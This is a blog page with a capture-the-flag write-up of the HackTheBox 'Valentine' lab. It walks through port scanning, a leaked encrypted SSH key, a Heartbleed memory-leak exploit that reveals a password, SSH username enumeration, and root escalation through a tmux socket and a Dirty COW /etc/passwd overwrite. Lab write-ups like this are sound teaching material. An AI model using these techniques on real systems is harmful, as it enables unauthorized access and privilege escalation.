<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Valentine | PwndSide</title><meta name=keywords content="privesc,web,linux,ssh"><meta name=description content="Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/valentine-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/valentine-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Valentine"><meta property="og:description" content="Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-29T20:29:34+02:00"><meta property="article:modified_time" content="2023-08-29T20:29:34+02:00"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Web"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Ssh"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Valentine"><meta name=twitter:description content="Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Valentine","item":"https://pwndside.github.io/posts/valentine-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Valentine","name":"Valentine","description":"Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version.","keywords":["privesc","web","linux","ssh"],"articleBody":"Room Information Room name: Valentine Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Valentine Tools Used nmap searchsploit ssh Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 36 │ PORT STATE SERVICE REASON VERSION 37 │ 22/tcp open ssh syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 │ (Ubuntu Linux; protocol 2.0) 38 │ | ssh-hostkey: 39 │ | 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA) 40 │ | ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6L │ HkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z │ 6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA │ 5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8 │ CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5Q │ REuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoR │ fGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaM │ cYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUS │ Gl1UsGjY0QGsA5l5ohfQ== 41 │ | 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA) 42 │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI │ 5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR │ 8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPP │ M7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9q │ deBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZU │ ADy8A6tbfSgopaeR2UN4QRgM1dX 43 │ | 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA) 44 │ |_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA │ ABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQe │ e5RRw9d+lgH3Fm5O9XI= 45 │ 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu)) 46 │ |_http-title: Site doesn't have a title (text/html). 47 │ |_http-server-header: Apache/2.2.22 (Ubuntu) 48 │ | http-methods: 49 │ |_ Supported Methods: GET HEAD POST OPTIONS 50 │ 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu)) 51 │ |_ssl-date: 2023-08-29T08:05:22+00:00; -7s from scanner time. 52 │ |_http-server-header: Apache/2.2.22 (Ubuntu) 53 │ | http-methods: 54 │ |_ Supported Methods: GET HEAD POST OPTIONS 55 │ |_http-title: Site doesn't have a title (text/html). 56 │ | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentin │ e.htb/stateOrProvinceName=FL/countryName=US 57 │ | Issuer: commonName=valentine.htb/organizationName=valentine.htb/state │ OrProvinceName=FL/countryName=US 58 │ | Public Key type: rsa 59 │ | Public Key bits: 2048 60 │ | Signature Algorithm: sha1WithRSAEncryption 61 │ | Not valid before: 2018-02-06T00:45:25 62 │ | Not valid after: 2019-02-06T00:45:25 63 │ | MD5: a413:c4f0:b145:2154:fb54:b2de:c7a9:809d 64 │ | SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1 65 │ | -----BEGIN CERTIFICATE----- 66 │ | MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV 67 │ | BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG 68 │ | A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1 69 │ | MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50 70 │ | aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB 71 │ | BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao 72 │ | oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1 73 │ | PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg 74 │ | 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6 75 │ | 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz 76 │ | pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O 77 │ | BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy 78 │ | fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7 79 │ | cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N 80 │ | XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO 81 │ | 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S 82 │ | q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP 83 │ | csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa 84 │ | gRSFfyZx/VqBh9c= 85 │ |_-----END CERTIFICATE----- 86 │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We can see three open ports one for ssh and two for web services.\nEnumeration Let’s start enumerating the ssl webpage.\nWe can see a picture as always I used exiftool, steghide and strings in order to see some interesting data but nothing useful.\nFuzzing the page I found the next directories\nffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -c -o fuzz | tee fuzz.save 61 │ [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 109ms] 62 │ | URL | http://10.10.10.79/dev 63 │ | --\u003e | http://10.10.10.79/dev/ 64 │ * FUZZ: dev 65 │ 66 │ [Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 113ms] 67 │ | URL | http://10.10.10.79/encode 68 │ * FUZZ: encode 69 │ 70 │ [Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 131ms] 71 │ | URL | http://10.10.10.79/decode 72 │ * FUZZ: decode 73 │ 74 │ [Status: 200, Size: 153356, Words: 627, Lines: 620, Duration: 116ms] 75 │ | URL | http://10.10.10.79/omg 76 │ * FUZZ: omg 77 │ 78 │ [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 96ms] 79 │ | URL | http://10.10.10.79/server-status 80 │ * FUZZ: server-status When we try to access to /dev we can two files.\nhype_key seems to be information in hexadecimal.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- Decoding the data we get an id_rsa but seems to be encrypted.\nI tried to crack the password with ssh2john but failed.\nTo do: 1) Coffee. 2) Research. 3) Fix decoder/encoder before going live. 4) Make sure encoding/decoding is only done client-side. 5) Don't use the decoder/encoder until any of this is done. 6) Find a better way to take notes. notes.txt leaks some instructions for the developer.\nNow let’s take a look at the encode/decode directories.\nAs we can see is only a clientside base64 encoder/decoder.\n/omg is only the homepage’s picture directory so there is nothing we can do at this point\nAfter navigating through each directory of the ssl webiste I accesed to the http website but I realized that is a copy of the ssl one.\nExploiting If we return to nmap and perform a vuln scan.\nnmap $IP -p22,80,443 --script=\"safe and vuln\" 5 │ PORT STATE SERVICE 6 │ 22/tcp open ssh 7 │ 80/tcp open http 8 │ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 9 │ 443/tcp open https 10 │ | ssl-poodle: 11 │ | VULNERABLE: 12 │ | SSL POODLE information leak 13 │ | State: VULNERABLE 14 │ | IDs: BID:70574 CVE:CVE-2014-3566 15 │ | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other 16 │ | products, uses nondeterministic CBC padding, which makes it easier 17 │ | for man-in-the-middle attackers to obtain cleartext data via a 18 │ | padding-oracle attack, aka the \"POODLE\" issue. 19 │ | Disclosure date: 2014-10-14 20 │ | Check results: 21 │ | TLS_RSA_WITH_AES_128_CBC_SHA 22 │ | References: 23 │ | https://www.imperialviolet.org/2014/10/14/poodle.html 24 │ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 25 │ | https://www.securityfocus.com/bid/70574 26 │ |_ https://www.openssl.org/~bodo/ssl-poodle.pdf 27 │ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 28 │ | ssl-ccs-injection: 29 │ | VULNERABLE: 30 │ | SSL/TLS MITM vulnerability (CCS Injection) 31 │ | State: VULNERABLE 32 │ | Risk factor: High 33 │ | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h 34 │ | does not properly restrict processing of ChangeCipherSpec messages, 35 │ | which allows man-in-the-middle attackers to trigger use of a zero 36 │ | length master key in certain OpenSSL-to-OpenSSL communications, and 37 │ | consequently hijack sessions or obtain sensitive information, via 38 │ | a crafted TLS handshake, aka the \"CCS Injection\" vulnerability. 39 │ | 40 │ | References: 41 │ | http://www.openssl.org/news/secadv_20140605.txt 42 │ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 43 │ |_ http://www.cvedetails.com/cve/2014-0224 44 │ | ssl-heartbleed: 45 │ | VULNERABLE: 46 │ | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. 47 │ | State: VULNERABLE 48 │ | Risk factor: High 49 │ | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the │ vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. 50 │ | 51 │ | References: 52 │ | http://www.openssl.org/news/secadv_20140407.txt 53 │ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 54 │ |_ http://cvedetails.com/cve/2014-0160/ 55 │ We can observe that there are some vulnerabilities associated with the ssl website.\nOne especially called my attention, checking the scan we can see that is vulnerable to heartbleed. This make sense because if we take a look at the homepage’s picture the heart bleeding gives us an clue of that vulnerability.\nHeartbleed vuln is a security bug in some outdated versions of the OpenSSL cryptography library, which is a widely used implementation of the Transport Layer Security protocol. The vulnerability was classified as a buffer over-read, a situation where more data can be read than should be allowed.\nGoogling we can find a github exploit which fits well.\npython2 heartbleed-exploit.py 10.10.10.79 Executing the exploit, the exploit start by sending the handshake and after that send a crafted heartbleed request and the server answer with the data leak is outputted in a file called out.txt\nOnce executed we retrieve the following data\n0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....\". 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 ................ 0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............3.2. 0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 ....E.D...../... 0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A............... 0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 ................ 0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 ..I...........4. 00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 2............... 00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 ................ 00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 ................ 00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E ....#.......0.0. 00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode.php..Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc 0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld 0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 3F mV0aGVoeXBlCg==? 0160: 23 66 17 BF 98 D1 4E C4 D9 A3 DE 86 47 94 A6 26 #f....N.....G..\u0026 0170: 38 38 88 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 88.............. 0180: 00 7E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 .~.............. 0200: 31 33 30 38 41 46 42 35 35 32 41 42 39 34 34 37 1308AFB552AB9447 0210: 43 31 31 46 39 32 42 31 34 30 42 45 44 38 41 46 C11F92B140BED8AF 0220: 43 32 38 36 38 37 41 36 36 32 37 45 45 32 30 35 C28687A6627EE205 0230: 42 42 30 37 32 38 36 43 42 31 41 31 46 38 35 46 BB07286CB1A1F85F 0240: 30 41 38 45 42 39 39 39 35 46 44 35 44 33 32 30 0A8EB9995FD5D320 0250: 44 39 35 44 45 44 37 30 32 32 43 44 34 36 34 22 D95DED7022CD464\" 0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69 \u003emac-intel..13:90:e8: 02a0: 61 34 3A 63 35 3A 32 30 3C 2F 6D 61 63 2D 61 64 a4:c5:20.VPN.https:/ 0300: 2F 31 30 2E 31 30 2E 31 30 2E 37 39 3A 34 34 33 /10.10.10.79:443 0310: 3C 2F 67 72 6F 75 70 2D 61 63 63 65 73 73 3E 0A . 0320: 3C 2F 63 6F 6E 66 69 67 2D 61 75 74 68 3E 74 58 tX 0330: F0 64 BF F5 03 D7 23 28 D7 34 DB 44 83 AE 38 82 .d....#(.4.D..8. 0340: 03 5A 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D .Z.............. 1f60: 71 A4 07 00 00 00 00 00 00 00 00 00 00 00 00 00 q............... If we observe the output we can see a text variable with base64 encoded text\n$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== Decoding the output we have the following text\nheartbleedbelievethehype We have something but we don’t know what we can do with this phrase.\nThe first thing that came to my mind was maybe is a password for the id_rsa but we don’t have any users by the way.\nAs the ssh version is so older maybe there is some exploit which help us to enumerate ssh usernames.\nThere is a bunch of them that fits so well. The one that I have selected waits for an username argument and tell us if it’s a valid username or not.\nsshenum.py [-h] [-p PORT] target username I have tried the default ones and some ones like heatbleed or hype since they compose the previously decoded text.\nroot and hype are the only valid ones.\nGaining an Initial Foothold I tried to access to each one using the decoded text as password and it works for hype.\nAs we are logged as hype, let’s cat the user’s flag\nEscalating Privilege First Way In order to privEsc I first go to see if there is some SUID files but nothing is useful, then I used moniProc.sh which is a bash script which I used in a lot of writeups, but only gets one cronjob which is executing a bash script on the roots directory so we can do nothing at this point.\nAs we don’t have the hype’s password we can’t exploit sudoers vulns.\nChecking at the hype’s home directory we can see that the .bash_history file is not empty.\nexit exot exit ls -la cd / ls -la cd .devs ls -la tmux -L dev_sess tmux a -t dev_sess tmux --help tmux -S /.devs/dev_sess exit The history shows the use of tmux opening a session file and if we check the file’s permissions the file seems to be a SUID file and the owner is the root user but the group owner is hype so we can execute it.\nSo let’s try to open the session file with tmux.\ntmux -S /.devs/dev_sess We have pwnd the system.\nLet’s cat the root’s flag.\nSecond Way There is other unintentional way to privEsc\nIf we check the kernel version we can see that is so outdated.\nIn this situations dirtycow is the fastest solution to help to privEsc. This vuln take advantage of race condition to write on the /etc/passwd.\nThe exploit which I am going to use creates a username called firefart with the password of your choice with root id.\nFirst if we take a look on the code we can find how to compile the file.\ngcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt Once compiled, I send the exploit via wget and a python server in order to execute it in the remote machine.\nNow let’s execute it, in this case I set firefart password as password.\nsu firefart Once logged as firefart we are able to see the flag at the root’s directory.\nThank you for reading, and happy hacking! 😄\n","wordCount":"2655","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-08-29T20:29:34+02:00","dateModified":"2023-08-29T20:29:34+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/valentine-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Valentine</h1><div class=post-description>Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version.</div><div class=post-meta><span title='2023-08-29 20:29:34 +0200 CEST'>August 29, 2023</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2655 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/valentine-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a><ul><li><a href=#first-way>First Way</a></li><li><a href=#second-way>Second Way</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Valentine</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Valentine>https://app.hackthebox.com/machines/Valentine</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/valentine-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>searchsploit</li><li>ssh</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl>  <span class=mi>36</span>   <span class=err>│</span> <span class=n>PORT</span>    <span class=n>STATE</span> <span class=n>SERVICE</span>  <span class=n>REASON</span>         <span class=n>VERSION</span>
